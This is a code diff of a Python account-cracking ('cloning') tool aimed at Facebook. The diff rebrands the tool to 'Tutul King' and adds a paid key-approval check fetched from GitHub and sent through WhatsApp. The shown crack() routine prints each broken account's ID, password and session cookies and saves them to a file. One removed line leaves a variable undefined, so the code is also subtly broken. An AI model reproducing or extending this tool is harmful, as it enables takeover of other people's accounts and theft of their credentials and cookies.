@@ -31,8 +31,6 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
-	open('.prox.txt','w').write(prox)
 	
 except Exception as e:
 	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTutul')
@@ -90,7 +88,6 @@ def uaku():
 		for ub in ua:
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
 		ua=open('.bbnew.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -165,8 +162,8 @@ os.system('clear')
 
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  shayan,  Harami,  Tools"')
-os.system('xdg-open https://https://www.facebook.comSHaYaNoHaRaMi007mibextidZbWKwL')
+os.system('espeak -a 300 " Welcome,   to,  Tutul,  King,  Tools"')
+os.system('xdg-open https://www.facebook.com/Tutul.King.Ok.Bro')
 def banner():
 	os.system("clear")
 	print (f"""
@@ -502,7 +499,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#Tutul-King
-				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•shayan-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Tutul-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
 				os.system('espeak -a 300 " Tutul,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
@@ -522,6 +519,7 @@ if __name__=='__main__':
 
 def Subscraption():
 	key1=open('/storage/emulated/0/android8.txt', 'r').read()
+	r1=requests.get("https://github.com/Tutul-King/Public-CloNing-42o/blob/main/Approval.txt").text
 	if key1 in r1:
 		os.system('clear')
 		login()
@@ -532,11 +530,11 @@ def Subscraption():
 		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Tutul King, ToOLs Daily Update")
 		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
 		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Tshayan+key1)
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Tutul+key1)
 		name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Name : ")
 		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
 		time.sleep(3.5)
-		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+shayan+''+key1
+		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Tutul+''+key1
 		os.system('am start https://wa.me/+9315962940?text=' + tks)
 		Subscraption() 
 Subscraption() 
